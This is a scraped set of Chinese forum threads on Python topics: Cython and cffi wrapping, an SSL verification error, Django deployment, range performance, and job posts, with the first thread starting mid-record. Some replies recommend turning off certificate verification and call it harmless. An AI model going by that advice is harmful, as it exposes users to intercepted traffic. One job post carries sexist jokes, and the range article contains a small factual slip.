free(s);\r", "}\r", "root@arch area: # 运行一下\r", "root@arch area: cc area.c && ./a.out && rm a.out\r", "area of the square: 30.000000\r", "root@arch area: # 为 area.c 定义包裹的 Cython 头文件\r", "root@arch area: cat carea.pxd \r", "cdef extern from \"area.h\":\r", "    cdef struct Square:\r", "        float length\r", "        float width\r", "\r", "    ctypedef Square *pSquare;\r", "\r", "    cdef float calc_area(pSquare);\r", "root@arch area: # 为 python 版本 Square 定义 Cython 头文件\r", "root@arch area: cat py_area.pxd \r", "cimport carea\r", "\r", "cdef class Square:\r", "    cdef carea.pSquare _square\r", "\r", "    cpdef float calc_area(Square)\r", "root@arch area: # 为 python 版本 Square 包裹一下\r", "root@arch area: cat py_area.pyx \r", "from cpython.mem cimport PyMem_Malloc, PyMem_Free\r", "\r", "cimport carea\r", "\r", "cdef class Square:\r", "    def __cinit__(self, length, width):\r", "        self._square = <carea.pSquare>PyMem_Malloc(sizeof(carea.Square))\r", "        if not self._square:\r", "            raise MemoryError(\"Memory not enough\")\r", "\r", "        self._square.length = length\r", "        self._square.width = width\r", "\r", "    def __dealloc__(self):\r", "        PyMem_Free(self._square)\r", "\r", "    cpdef float calc_area(self):\r", "        return carea.calc_area(self._square)\r", "root@arch area: # 调用一下\r", "root@arch area: # 哦不，先写好 setup.py ，然后编译\r", "root@arch area: cat setup.py \r", "from distutils.core import setup\r", "from distutils.extension import Extension\r", "from Cython.Build import cythonize\r", "\r", "ext_modules = cythonize([\r", "    Extension(\"py_area\", [\"py_area.pyx\", \"area.c\"])\r", "])\r", "\r", "setup(ext_modules=ext_modules)\r", "root@arch area: python3 setup.py build_ext --inplace\r", "running build_ext\r", "building 'py_area' extension\r", "gcc -pthread -Wno-unused-result -Wsign-compare -DNDEBUG -g -fwrapv -O3 -Wall -Wstrict-prototypes -march=x86-64 -mtune=generic -O2 -pipe -fstack-protector-strong -march=x86-64 -mtune=generic -O2 -pipe -fstack-protector-strong -march=x86-64 -mtune=generic -O2 -pipe -fstack-protector-strong -fPIC -I/usr/include/python3.6m -c py_area.c -o build/temp.linux-x86_64-3.6/py_area.o\r", "gcc -pthread -Wno-unused-result -Wsign-compare -DNDEBUG -g -fwrapv -O3 -Wall -Wstrict-prototypes -march=x86-64 -mtune=generic -O2 -pipe -fstack-protector-strong -march=x86-64 -mtune=generic -O2 -pipe -fstack-protector-strong -march=x86-64 -mtune=generic -O2 -pipe -fstack-protector-strong -fPIC -I/usr/include/python3.6m -c area.c -o build/temp.linux-x86_64-3.6/area.o\r", "gcc -pthread -shared -Wl,-O1,--sort-common,--as-needed,-z,relro -Wl,-O1,--sort-common,--as-needed,-z,relro build/temp.linux-x86_64-3.6/py_area.o build/temp.linux-x86_64-3.6/area.o -L/usr/lib -lpython3.6m -o /root/tests/area/py_area.cpython-36m-x86_64-linux-gnu.so\r", "root@arch area: # 调用\r", "root@arch area: ipython\r", "Python 3.6.0 (default, Dec 24 2016, 08:03:08) \r", "Type \"copyright\", \"credits\" or \"license\" for more information.\r", "\r", "IPython 5.1.0 -- An enhanced Interactive Python.\r", "?         -> Introduction and overview of IPython's features.\r", "%quickref -> Quick reference.\r", "help      -> Python's own help system.\r", "object?   -> Details about 'object', use 'object??' for extra details.\r", "\r", "In [1]: import py_area\r", "\r", "In [2]: a = py_area.Square(10, 20)\r", "\r", "In [3]: a.calc_area()\r", "Out[3]: 200.0\r", "\r", "In [4]:                                                                                                                                \r", "Do you really want to exit ([y]/n)? \r", "root@arch area: \r", "```", "代码缩进全乱了。贴一下 gist: ", " 多谢！\r", "\r", " 感谢！已 star 。我只读了一点 Kurt M. Smith 的 Cython 那本书，本身不是程序员，好多年没写过 C ，感觉看 Cython 文档也很不友好，请问你是如何学习 Cython 的（比如流程方面）？你 notebook 里生成文件的用法之前没见过，很赞！\r", "\r", " 谢了哈！目前只有用 Python 的需求\r", "\r", " 感谢！已 star 。之前不知道一定要写 pxd ，还得写两个。另外，请问你 Cython 的学习路径是怎样的？感觉对非程序员初学者来说学习曲线好陡峭", " 另外再请教下，中间这步制成静态库有什么作用？跳过这步似乎不影响给 Python 调用。\r", "!gcc -c square.c -o square.o\r", "!ar rcs libsquare.a square.o", "py_area.pxd 不是必须的，可以把声明_square 类型那一行移到 py_area.pyx 里。我是看了一遍官方文档，然后看了一下 cython ： a guide to python programmers 前几章，又跳回去把官方文档看了一遍。我也是这几天才开始看 cython 的😅如果有 python 和 c 基础的话，仔细读读这两个文档，然后一边看一边自己验证应该不用太久的", " 感谢！我现在发现我真正要 wrap 的复杂 C 程序的函数接口写得很糟糕，在函数中调用了一些全局变量，这些全局变量通过 IO 读取数值，我在 Cython 中该如何处理这种情况？需要把那些全局变量也全部 wrap 成 python 的变量么？", " @", " 我把关于公共变量的问题相关代码放到这个 gist 中去了 ", "\r", "\r", "square.c 文件中添加了公共变量 glb_f ，请问如何 wrap 能在 Python 中访问修改这个变量？", "  我也不是程序员出生, 有做科学计算的需要才开始写程序的\r", "\r", "根据个人经验, 要用好 cython 的话需要一定的 c 基础, 要比较熟悉 c 的各种玩法. 我感觉 cython 最大的好处就是把权衡交给程序员, 也可以完全避开 c, 就用 cython 跟 python 的东西, 这几乎可以解决大多数 python 执行效率的问题了, 极少时候, 如果还想继续提升性能, 一般是需要更复杂的并行, 或者无法完全避开 gil 的问题, 就在 cython 中用更多的 c/cpp, 还不行就把这部分完全剥离到 c/cpp 库中完成计算, python 负责预处理后处理, cython 作为桥梁. \r", "\r", "反复地看 cython 官方文档, 有空就去逛逛 stackoverflow, 看看相关的问题, 多逛逛相关博客, 不明觉厉的东西要保存下来, 然后逐步的处理, 整理到自己的知识系统, 使用中遇到的问题以及解决方法要详细的记下来, 因为很可能再次遇到, 这时候想起以前遇到过但是忘记解决办法了是很恼火的. 多看看 cython 的相关项目, 因为投身于科学计算, 所以比较关注这方面的库, 比如 cython_gsl, 包装的科学计算库 GNU Scientific Library(GSL); cy_armadillo, 包装 cpp 的 armadillo 库, 都是开源项目, 看这些源码的时候 c/cpp/cython 的熟悉程度是同步提升的, 还有 cython 自带的那些 pxd 是包装 c/cpp 标准库最好的例子. 其实学任何技术都是这个过程吧. cython 的书籍的话我也只有你上面提到的那本.如果你从事科学计算方面, 推荐下张老师 @", ", 我是跟着他一路小跑过来的 233, 可以去搜下他的博客, 论坛, 书籍\r", "-------------------------------------------------------------------------------------------------\r", "\r", "如果不是已经无法修改的 C 库的话, 建议还是直接放到 cython 中写, 不必写个.c 来包装.\r", "\r", "包装那个全局变量的话:\r", "1.c 的头文件声明 float glb_f;\r", "2.pxd 里面也做相应声明 cdef extern from \"square.h\": float glb_f\r", "3.pyx 里面的修改\r", "cimport square\r", "...\r", "def __init__(self, width, length, global_f=1.0):\r", "    square.glb_f = global_f  # 从这儿设置这个全局变量\r", "    self.s_ptr.width = width\r", "    self.s_ptr.length = length", " 试了一下直接声明全局变量没成功，编译不过。但是我想可以用曲折的办法就是给全局变量写上 getter/setter 然后把这几个函数包装一下，在 python 层面再做成 property 。", " 你好强大！我应该算不上做科学计算的，但是我是做科学数据分析的，所以会和各种数据分析工具打交道。最近就需要把一个科学家写的很糟糕的 C 程序 wrap 了给 python 调用。。。才开始看 Cython ，本身对 C 语言只知道点皮毛而已。\r", "\r", " 多谢！我试试看", " 那差不多, 我也是做些计算, 数据分析之类的,  物理生→_→", "下面是用 cffi 包装的例子：\r", "\r", "\r", "\r", "调用 build.py 编译扩展模块，然后运行 test.py 测试。\r", "\r", "在 square.h 中声明 extern 的全局变量 glb_f 。在 Python 中可以直接通过 lib.glb_f 设置该全局变量。使用 ffi.new(\"sq\", ...)创建结构体，可以使用字典初始化结构体，也可以通过属性访问结构体的字段。\r", "\r", "build.py 中的 ffibuilder.cdef(\"...\")是声明需要包装的类型，变量以及函数的地方。这里可以直接使用 C 语言的头文件 square.h 中的内容。不过头文件中不能有预处理命令。如果有预处理命令的话，则需要手动调整声明。", " 谢谢张老师！ cffi 看着好简洁，我去刷一遍文档", "\r", "\r", "搞定！ :)", " 厉害！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>requests 调用 API 报错 requests SSL: CERTIFICATE_VERIFY_FAILED ，但可以确认 API 的证书没问题，用浏览器都可以正常访问。大家遇到过这个问题吗？</p>\n<p>环境：\nubuntu 14.04<br>\nvirtualenv\npython 2.7.6\nrequests 2.12.4</p>\n<p>参考过 <a href=\"http://stackoverflow.com/questions/29134512/insecureplatformwarning-a-true-sslcontext-object-is-not-available-this-prevent\" rel=\"nofollow\">http://stackoverflow.com/questions/29134512/insecureplatformwarning-a-true-sslcontext-object-is-not-available-this-prevent</a>  这个问题，但依然没能解决。</p>\n</div></div>"], "reply": "20", "tittle": "Python requests SSL: CERTIFICATE_VERIFY_FAILED 错误", "comment": ["requests.packages.urllib3.disable_warnings()", " 直接忽略就相当于不验证，不太合适吧。\r", "没有直接解决方案吗？", "实在没办法的话只能 verify=False 了", "自签的证书吧？ curl 报错么？", "如果不是自签的证书，就手动指定全部根证书位置吧。", " win 下的 curl 表示各种网站都报错 xD 。", " 通配符， curl 正常", " 买的 GlobalSIgn 的通配符证书", "因为 certifi 的问题，你换个版本就行了，或者删掉", " 多谢~", " 不过卸载了也不好使，最新版本和 2015.04.28 那个版本都不行", " 那可能就需要你自己调试下了，我这边只有 centos6.5 ， uninstall certifi 之后是可以访问 https 的", "用 Python3", "看看 ssl 的协议 requests 是否支持", "配置 API 的证书时候有没有忽略中间证书？", "apt-get upgrade 试试。", "升级到 2.7.10 +", " VERIFY=False ，直接解决，验证不验证无所谓，有些证书是自签的或者过期了，你想请求内容直接放弃就行，除非你怕被劫持流量", "缺少中间证书可以导致此问题（浏览器中正常， requests 验证失败）。", "你这个信息太少了， requests SSL: CERTIFICATE_VERIFY_FAILED ，没有说为啥失败。 curl 可以，猜测是因为 python 没能正确找到 ca 证书，得把为啥失败了贴出来。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>彩虹云直播 - 在微信里面做直播,服务 B 端客户\nweb: <a href=\"http://rainbowlive.tv\" rel=\"nofollow\">http://rainbowlive.tv</a></p>\n<h1>资深后端工程师</h1>\n<blockquote>\n<p>工作年限： 3-5 年</p>\n</blockquote>\n<h2>职位描述：</h2>\n<ol>\n<li>依据产品需求确定技术方案，参与技术研究及选型，撰写相关技术文档；</li>\n<li>负责服务器端开发及维护，参与架构及算法设计；</li>\n<li>制定开发规范，持续构建流程、发布流程；</li>\n<li>解决开发过程中的技术难题，确保系统的安全、质量和性能；</li>\n<li>指导和支撑业务开发，技术团队核心成员。</li>\n</ol>\n<h2>职位要求：</h2>\n<ol>\n<li>3 年以上软件开发经验并且有 2 年以上 Python 开发经验，熟练使用 Python 常用模块和第三方模块、框架；</li>\n<li>对软件产品有强烈的责任心、良好的沟通能力和团队协作能力</li>\n<li>愿意不断的推动新技术和工艺的实施，提高开发效率</li>\n</ol>\n<h2>加分项：</h2>\n<ol>\n<li>有大型网站项目开发经验；</li>\n<li>熟悉 Django ， Flask ， Bottle 或其他 Python Web 开发框架；</li>\n<li>有高并发、高访问的大型服务开发经验；</li>\n<li>扎实的其他语言开发经验；</li>\n<li>熟悉 MySQL 、 MongoDB 等数据库， 对数据库表设计有丰富经验；</li>\n<li>有爬虫开发经验</li>\n</ol>\n</div></div>", "<div class=\"topic_content\">15-30 w</div>"], "reply": "4", "tittle": "招募资深后端工程师 @HangZhou", "comment": ["工资", "15w 。。。", " 额，是稍低了点，这是起点哈", " 问题是现在的薪酬范围比较坑，大部分人默认能拿到的薪酬是靠近左侧，除非你技术能力真的很牛，也很自信，并且在面试的时候能不被打击，没遇到挑刺的。"]},
{"content": ["<div class=\"topic_content\">有一个 TXT 文件里存着 1.jpg 、 2.jpg 若干个文件  这些文件分散在 C 盘不同的文件夹内\r<br>假如我需要找我在 C 盘目录下的这些文件 想得到如下结果 \r<br>1.jpg ：路径\r<br>…………\r<br>\r<br>除了遍历外有啥高效点的方式么？</div>"], "reply": "目前尚无回", "tittle": "Python 找某个文件夹下某些文件的路径有什么好的方法么", "comment": []},
{"content": ["<div class=\"topic_content\">Java 3 年 Python 1 年，主要是 web 开发，这段时间工作不是很忙，可以投入几个月每天比较稳定的时间 contribute ，有 python 开源项目需要人吗？谢谢</div>"], "reply": "3", "tittle": "有没有 Python 开源项目需要 dev 的，我可以参与一起做", "comment": ["这种方式问是不是不好...", "表示同样想找开源项目~", "可以试试 ansible ，名气大，而且写插件很容易，可以给自己简历上装下逼哈~"]},
{"content": ["<div class=\"topic_content\">求一个指路。</div>"], "reply": "5", "tittle": "［国外爬虫］如何找一个好的美国代理，爬美国网站", "comment": ["免费的没有好的", "付费的 也没有问题 @", "通过 ss 带 Tor", "另外你还需要 ua-faker"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><code>urllib2</code>:</p>\n<pre><code>Date: XXX\nServer: Apache\nLast-Modified: XXX\nAccept-Ranges: bytes\nContent-Length: 12345678\nVary: Accept-Encoding\nConnection: close\nContent-Type: text/plain\n</code></pre>\n<p><code>requests</code>:</p>\n<pre><code>Content-Encoding: gzip\nAccept-Ranges: bytes\nVary: Accept-Encoding\nKeep-alive: timeout=5, max=128\nLast-Modified: XXX\nConnection: Keep-Alive\nETag: xxxxxxxxx\nContent-Type: text/plain\n</code></pre>\n<p>为何 requests 少了 content-length ？其它发送请求的设置是完全一样的。。 requests 和 Chrome 开发者工具查看到的一致。但是这里我又需要 content-length 的值（为了断点续传）</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>import urllib2 \nimport requests \n\nurl = 'exmaple.com' \nheaders = { \n\"Authorization\": \"Basic xxxx\", \n\"Range\": \"bytes=0-\" \n} \nreq = urllib2.Request(url, headers=headers) \nresp = urllib2.urlopen(req) \nprint resp.info() \nr = requests.get(url, headers=headers) \nprint r.headers \nassert resp.info()['ETag'] == r.headers['ETag'] \n</code></pre>\n<pre><code>Date: Sat, 14 Jan 2017 09:39:50 GMT\nServer: Apache\nLast-Modified: Sat, 14 Jan 2017 09:39:49 GMT\nETag: \"e91103-10e04f7-5460abb4743a3\"\nAccept-Ranges: bytes\nContent-Length: 17695991\nVary: Accept-Encoding\nContent-Range: bytes 0-17695990/17695991\nConnection: close\nContent-Type: text/plain\n\n{'Content-Encoding': 'gzip', 'Transfer-Encoding': 'chunked', 'Accept-Ranges': 'bytes', 'Vary': 'Accept-Encoding', 'Keep-Alive': 'timeout=5, max=128', 'Server': 'Apache', 'Last-Modified': 'Sat, 14 Jan 2017 09:39:49 GMT', 'Connection': 'Keep-Alive', 'ETag': '\"e91103-10e04f7-5460abb4743a3\"', 'Date': 'Sat, 14 Jan 2017 09:39:50 GMT', 'Content-Type': 'text/plain'}\n</code></pre>\n<p>我也知道肯定是两次发送的请求header不一样。。。现在总算解决了。。</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>The response is different because requests indicates that it supports gzip-encoded bodies, by sending an Accept-Encoding: gzip, deflate header field. urllib2 does not. You'll find if you added that header to your urllib2 request that you get the new behaviour.</p>\n</blockquote>\n<blockquote>\n<p>Clearly, in this case, the server is dynamically gzipping the responses. This means it doesn't know how long the response will be, so it is sending using chunked transfer encoding.</p>\n</blockquote>\n<blockquote>\n<p>If you really must get the Content-Length header, then you should add the following headers to your Requests request: {'Accept-Encoding': 'identity'}.</p>\n</blockquote>\n</div></div>"], "reply": "15", "tittle": "请求同一个网址， requests 和 urllib2 返回的 headers 内容不同？", "comment": ["看官方文档", "Content-Length 不应该手动设置", " 我描述不清～～上边给出的结果是响应的 header ，我的意思是需要知道当前 content-length 的值。。但是 requests 的返回里面没有。。 urllib2 就有。。\r", " 文档已经看了许多遍了。。怀疑是服务器的问题？", "你这是结果，肯定还是因为你发送的请求不一样", "你把代码也贴出来啊……", "{'Range': 'bytes=0-', 'Authorization': 'Basic XXX'}\r", "\r", "手动加了这个 header ， urllib2 和 requests 返回的 ETag 都是一样的啊。。为什么会发送请求不一样呢。。 @", "```\r", "import os\r", "import urllib2\r", "import requests\r", "\r", "url = '", "'\r", "headers = {\r", "\"Authorization\": \"Basic xxxx\",\r", "\"Range\": \"bytes=0-\"\r", "}\r", "req = urllib2.Request(url, headers=headers)\r", "resp = urllib2.urlopen(req)\r", "print resp.info()\r", "\r", "r = requests.get(url, headers=headers)\r", "print r.headers\r", "assert resp.info()['ETag'] == r.headers['ETag']\r", "```", "  贴在楼上了。。我发现我都不在回复里贴代码了。。", "明显你的 request header 不一样", "requests 允许额外设置 auth 么？\r", " 开始就使用的文档里的方法，结果跟换成手动设置 auth 一样的。。", "试试随机 ua", "谢谢大家。。", "抓包看看发送的请求有木有区别", "跟这个原因是一样的。\r", "\r"]},
{"content": ["<div class=\"topic_content\">先上 JD\r<br>\r<br>公司 京东-金融 网银在线\r<br>\r<br>职位名称：\r<br>PYTHON 开发工程师\r<br>\r<br>职位描述：\r<br>负责公司架构层面的平台工具开发，数据采集、分析、呈现。\r<br>\r<br>\r<br>职位要求：\r<br>1 计算机或相关专业本科以上学历。\r<br>2 熟练使用 linux/unix 平台开发。\r<br>3 精通 Python 。熟练使用一种 WEB 框架，例如 django, webpy, tornado.\r<br>4 熟练使用 Perl 、 Ruby 、 Bash 等脚本语言中的至少一种。\r<br>5 理解 HTTP 、 DNS 等常见服务原理。\r<br>6 精通 mysql 等关系数据库，熟练使用 mongodb 等 nosql 数据库。\r<br>7 熟悉 javascript 、 css 前端技术，掌握 jquery bootstrap 等常用框架。\r<br>8 有大数据分析经验优先。\r<br>9 高度责任心,积极主动,有团队精神。\r<br>10 思维缜密，有良好的沟通能力和学习能力者优先。\r<br>\r<br>\r<br>\r<br>\r<br>下面说点正经的\r<br>1 有漂亮妹子\r<br>2 氛围轻松\r<br>3 养猫的优先\r<br>4 玩游戏的优先 尤其主机\r<br>5 玩乐器的优先\r<br>\r<br>\r<br>欢迎来投\r<br><a target=\"_blank\" href=\"mailto:rockyaow@163.com\">rockyaow@163.com</a></div>", "<div class=\"topic_content\">地点是在北京亦庄哦\r<br>\r<br>只招高级工程师\r<br>\r<br>待遇可以谈 肯定不会低的，看水平喽~</div>", "<div class=\"topic_content\">加班不是强制的，但是要看工作完成情况。\r<br>\r<br>如果进度过慢，肯定也是要自行加班的。</div>", "<div class=\"topic_content\">漂亮妹子还要什么照片，直接来面试自己亲自看</div>"], "reply": "39", "tittle": "年底了，发个 Python 的招聘 ^ ^", "comment": ["正在通往这条路上！", "我怎么感觉后面说的都是不正经的呢 = =", "在北京吗？\r", "话说为什么精通了 Python 这门脚本语言之外还要求熟练使用 Perl 、 Ruby 、 Bash 等脚本语言中的至少一种", "同楼上问", "三楼说的很对！\r", "\r", "还有听说京东的加班时间 top1 ，这是真的吗？", "最重要的工资和加班没说 ：）", "地址没说...", "漂亮妹砸的照片呢", "在北京亦庄\r", "\r", "只招高级工程师\r", "\r", "待遇可谈 肯定不会低", " 大多数项目是 PYTHON 的 也有个别其他的", " 看个人情况吧，如果天资聪颖，整天混吃等死也问题不大", "没图你说 d", "养猫这一天就没兴趣了", "漂亮不单身", "都会。但是不想去北京咋办。。。", "厉害了。", " 还要啥自行车", "北京雾霾那么大", "我敢打赌，楼主肯定拿不到漂亮妹子的照片。", "另外这是偏向， web 还是运维还是算法还是机器学习还是 NLP 呢\r", "\r", "看起来貌似需要 web 的能力，又需要大数据分析的能力。有可能是将大数据分析的结果通过 web 做一个 Portal ？\r", "即要分析也要输出，还要会前端。", " 撞脸了", " 不好意思  我头像换了", " 术业有专攻 擅长哪个都行", "漂亮妹子供应量是多少？可以带回家使用吗？有说明书吗？", "会吉他，大学学院的吉他社就是我组建起来的，会这一点 py ，遗憾不是计算机专业。", "亦庄，好远啊", "完全不想去北京", "这个 jd 跟我之前的日常工作内容一模一样…", " 都不是充气的 看你撩妹技能了", " 哦？", "   没什么，就是感慨一下。相信京东肯定办公条件、待遇获得的成长都比我以前的工作单位要好。还是值得一去的。", "亦庄林肯公园的路过 楼主是在哪", " 经海路", "只招高级的吗，有个同学家的妹妹，正在找 python 相关的开发工作，工作 1 年多", " 只要高级", "男不养猫女不养狗！", "高级是什么概念，有没有量化标准\r", "\r", "顺便问一下支持电话面试吗", " 上海来吗？", " 谢谢，我问了下，她暂时考虑工作地点在北京"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在同学的介绍下接了两个做公司网站的外单, 都只是简单的公司官网, 访问量不大对性能没有太大的要求. 经过一番调查发现 Django 用来做这种类型的网站很快速方便, 目前两个网站已经开发完毕并且部署到服务器上稳定运行了一段时间. 但是个人并没有运营任何 Python/Django 的经验, 部署方案都是自己参考网上一些文章摸索出来的. 部署方案是没什么复杂的, 但是很好奇正规 Django 项目的部署方案是什么样的? 怎么做负载均衡? 我现在的部署方案是否存在一些显而易见的错误或者不合适的地方? 想跟大家讨论一下. <strong>总得来说就是想知道正规的线上 Django 项目都是怎么部署的.</strong></p>\n<h4>下面是我正在使用的部署方案</h4>\n<ul>\n<li>Nginx: 处理 http 请求, 静态文件让 Nginx 来处理, 动态请求交给后面的 uWSGI;</li>\n<li>uWSGI: uWSGI 相对于其他同类在性能和功能上好一些, 网上关于部署 Django 项目的文章基本上都是以 uWSGI 做例子;</li>\n<li>Supervisor: 进程管理工具, 这里的作用只是让 uWSGI 的进程挂掉或者重启系统之后能自动启动. <strong>这里听到一个说法, SuperVisor 适用于开发环境, 正式环境用 pm2 更合适, pm2 是提供了一些监控的功能, 但是我没这个需求用 SuperVisor 也是没问题的吧?</strong></li>\n<li>发布版本: 手动到服务器上跑<code>git pull</code>命令更新代码, 然后执行<code>supervisor restart xxx</code>, <strong>这里用 Jenkins 是不是可以减少一些工作?</strong></li>\n<li>~~Virtualenv: 暂时没用, 因为两个网站都使用相同的依赖包, 没有这个需求.~~</li>\n</ul>\n<h4>关于迁移 Django 项目网站</h4>\n<p>之前服务器并不是很稳定, 所以导致经常更换服务器. 迁移的步骤都是手动的, 首先迁移相关的源码和静态文件, 然后再迁移数据库, 有点繁琐. 这里用 Docker 是不是可以减少迁移的重复工作?</p>\n</div></div>"], "reply": "11", "tittle": "Django 项目部署方案的讨论和疑问", "comment": ["uwsgi 并没有特别快， bjoern + gunicron 也很快，关键是 gunicron 的配置简单多了。使用 uwsgi 的前提是你用了很多 uwsgi stack 。若是没有特别要求，我觉得 gunicron 更好。", "部署可以参考： ", "每次都忍不住发一遍  ", "  另外 可以在 git hooks post-update 里面写脚本 git check  和重启 supervisor", "把你的程序单独放到 docker container 里面运行设成 restart always 就好，不需要 supervisor 和 virtualenv 。\r", "\r", "把 nginx 和 db 一类的都做成另外的 container ，最后用 docker-compose 设定关系。\r", "\r", "Jenkins 用来跑测试和 build 和 push docker image", "我们是 django + uwsgi + nginx 一个 docker 容器， db 另一个容器，用 compose 来 run\r", "\r", "代码是将 容器 1 中的一个目录 如 /codebase 做成一个 Volume ，更新代码 restart 就好了", " docker +1 \r", "这种小站点，直接每个 django 网站一个 docker ，里面跑 gunicron  。建议每个站点一个 docker-compose 。\r", "另外对外可以用 ", " 做反代，能够自动扫面运行中的 docker 容器自动反代。\r", "每上线一个新站点直接启动一个新的 docker 容器，在 docker 容器环境变量里面注明域名，是否需要自动申请 https 证书， nginx-proxy 会自动反代及申请证书。", " 就几台服务器也需要用 docker 吗？", " 那 celery 那种 task 怎么办,crontab 怎么办，怎么调试呢", " 就一台服务器也可以用 docker", "总体差不多 另外还用了 fabric", " 我们的 task 是在 docker 外做的， django 只提供入口..."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在 Python 中，表达式 1000000000000000 in range(1000000000000001) 的执行速度能有多快？</p>\n<p>判断一个元素 x 是否存在于集合 y 中最简单粗暴地方法就是迭代，每次取出一个值与之比较，如果集合中存在一个值 z 等于 x 就返回 true ，它的时间复杂度是 O(n)，使用哈希算法的理论时间复杂度是 O(1)，二分查找的时间复杂度是 O(log n)，那么 Python 究竟会采用的哪种算法来实现呢？</p>\n<p>先来做个实验：</p>\n<pre><code>#python2\n\ntimeit.timeit('1000000000 in range(0,1000000000,10)', number=1)\n5.50357640805305\n\ntimeit.timeit('1000000000 in xrange(0,1000000000,10)', number=1)\n2.3025200839183526\n\n# python3\n\nimport timeit\ntimeit.timeit('1000000000 in range(0,1000000000,10)', number=1)\n4.490355838248402e-06\n</code></pre>\n<p>我们都知道 python2 中的 range 函数返回的是一个列表对象，一次性把所有的元素加载到内存，所以执行第一个表达式的时候，系统会突然感觉非常卡顿，它需要的时间是 5 秒多。</p>\n<p>xrange 和 python3 中的 range 函数类似，都是返回一个迭代器对象，但是它俩的执行结果相差悬殊，让人大跌眼镜。第三个表达式所花的时间接近 0 秒，为何 python2 的 xrange 与 python3 中 range 函数区别这么大？为了弄明白其中的玄机，我们要理解 in 操作是如何执行的。根据 Python 文档 in 的规则：</p>\n<p>如果该类实现了__contains__()方法，那么只要 y.<strong>contains</strong>(x) 返回 true 那么 x in y 也返回 true ，反之亦然。\n没有实现__contains__()方法，但实现了__iter__()方法，那么在迭代过程中如果有某个值 z==x ，就返回 true ，否则就是 false 。\n如果以上两个方法都没有实现，就看__getitem__()方法， 如果存在一个索引 i 使得  x==y[i] ，就返回 true ，否则返回 false 。\n明白了 in 的规则之后，我们先看看 xrange 提供了哪些方法：</p>\n<pre><code>dir(xrange)\n\n['__class__','__getitem__', '__hash__', '__init__', \n'__iter__', '__len__', '__new__', ...]\n</code></pre>\n<p>是的， xrange 函数只实现了 <strong>getitem</strong> 和 __iter__，判断 x 是 是否在 y 中需要逐个值迭代进行比较，也就是说 xrange 的时间复杂度是 O(n)。</p>\n<p>再来看看 python3 的 range 有哪些方法：</p>\n<pre><code> dir(range)\n['__class__', '__contains__', '__getitem__', '__iter__',  \n'count', 'index', 'start', 'step', 'stop', ...]\n</code></pre>\n<p>range 提供的属性比 xrange 要多很多，不仅实现了 <strong>getitem</strong> 和 <strong>iter</strong> ，还实现了 <strong>contains</strong> ，所以它会优先调用__contains__方法，此外，它还提供了三个属性 start 、 stop 、 step 。那么究竟为什么它的执行速度会如此之快呢？来看看 contains 方法是如何实现的吧。</p>\n<p>在 Python3 中，__contains__ 并不是逐个值迭代对比，而是采用这样一种逻辑：</p>\n<ul>\n<li>首先检查 x 是否 在 start 和 stop 范围之间： start &lt;= x &lt; stop</li>\n<li>如果在这个区间范围，那么再根据 step 计算 x 是否刚好落在 xrange 区间中的某个值上，这里用取模的方式来判断：(x - start) % step == 0</li>\n</ul>\n<p>此刻真相大白， xrange 的时间复杂度是 O(1)，也就是说不管 xrange(start, stop, step) 中的 stop 值多大，时间复杂度都是一个常量。所以 python3 中的 range 方法不仅可以节省内存，而且执行效率更高，所以不要再纠结学 Python2 还是 Python3 了。</p>\n<p>也可以把它当作一到面试题来问： Python2 中的 xrange 与 python3 中的 range 有什么区别？它不仅可以考察候选者对 Python3 的熟悉程度，而且可以看出候选者对一个知识点的理解深度。</p>\n<p>公众号『一个程序员的微站』分享 Python 干货和有温度的内容</p>\n<p><img alt=\"iamge\" src=\"http://mmbiz.qpic.cn/mmbiz_jpg/rO1ibUkmNGMljGFcQ1DibKicobibHkXib9MRO58DLj6Zj1RQXUwicicxcP2nvicSEoBm3d29kW6HsHRnct5reI4CicXpFWw/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\"></p>\n</div></div>"], "reply": "13", "tittle": "1000000000000000 in range(1000000000000001) 的执行速度为什么这么快", "comment": ["探讨很有意思，但“ python3 中的 range 方法不仅可以节省内存，而且执行效率更高”这个结论似乎不是很直接啊，只有在 in 这个例子里有用吧？", "一下子好像想不出判断一个常数是否在一个 range 里的用处啊。。。不知哪位能赐教一下？", "蛮有意思的", "\r", "\r", "路过，附上 Python3.6 里 range 的 contains 方法的实现片段, btw python2.7 里没有实现 contains", "把这种问题当成面试题是有多疯。。。", "立马就关注了，喜欢这样深入的姿势", " 节省内存是 range 返回的是一个迭代器的特性带来的优势", " python2 中没有__contain__方法的这个问题其实很早就在 python 社区提出来了，不过最终他还是没有并入到 python2 中，而是直接集成到 python3 中去了\r", "\r", "编译成字节码看，然后对照 Python 源码去理解，是个比较好的办法吧？", " 没有办法，官方也不可能在一个即将要死的版本上添加新 feature ，无论从意义上还是从版本的兼容上。", " 这种题当面试题的公司基本可以转身就走了，真想折磨人 python 能问的问题可多了（越甜的糖越有毒）， cpython 的实现不好的地方也有太多，比如最近 3.6 的 dict 重新实现，如果这个 range 的问题能算面试题的话，是不是所有的 PEP 都可以随机抽出来做面试题呢？仅个人意见，不代表真实情况。", " 纯粹作为开放式的话题吧，不能说这个答不出来就直接否定你，只是说答好了可以加分，答不好也没太大关系", " 这种有标准正确答案的问题不算是开放性的问题吧，对面试的效应姑且不谈，只是个人认为问这种问题面试官有 zb 的嫌疑，当然，这不是什么高端 b （为了避免误会，这么说没有刻意针对你和你的主题的意思啊。。"]},
{"content": ["<div class=\"topic_content\">有一个应用需要 conda forge ，但是一旦用了的话就会把其他的模块版本搞得一团糟。可以用 env 将 conda forge 隔离出来吗？</div>"], "reply": "目前尚无回", "tittle": "anaconda 可以在 env 下面启用 conda forge 吗", "comment": []},
